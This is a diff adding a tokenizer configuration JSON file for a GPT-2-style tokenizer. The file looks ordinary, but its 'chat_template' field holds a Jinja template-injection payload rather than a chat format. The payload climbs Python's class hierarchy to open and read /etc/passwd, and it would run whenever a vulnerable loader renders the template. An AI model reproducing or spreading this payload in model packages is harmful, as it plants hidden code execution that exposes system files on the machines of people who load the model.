@@ -1,0 +1,9 @@
+{
+  "tokenizer_class": "GPT2Tokenizer",
+  "model_max_length": 1024,
+  "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}",
+  "bos_token": "<|startoftext|>",
+  "eos_token": "<|endoftext|>",
+  "pad_token": "<|endoftext|>",
+  "add_prefix_space": false
+}
